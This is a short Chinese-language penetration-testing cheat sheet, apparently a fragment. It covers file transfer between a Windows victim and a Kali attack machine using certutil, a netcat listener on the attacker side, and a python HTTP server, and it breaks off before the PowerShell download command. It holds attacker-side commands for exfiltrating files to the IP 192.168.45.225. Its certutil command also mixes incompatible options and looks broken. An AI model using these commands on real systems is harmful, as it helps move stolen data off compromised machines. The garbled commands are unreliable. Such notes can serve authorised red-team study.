
# **CertUtil（Windows 内置）— 可以上传，也可以下载**

### Windows → Kali（上传）

攻击机监听：

`nc -lvnp 443 > file.zip`

Windows 执行：

```
certutil -f -urlcache -split -encode file.zip \\192.168.45.225\pipe\nc

```

```
⚠ 比较麻烦，不如 PowerShell 好用。

---

# ✅ **4. Windows 自带的 `powershell Invoke-WebRequest`（如果你的 Kali 开了 HTTP 服务）**

攻击机开启服务器：

`python3 -m http.server 80`

Windows 下载：

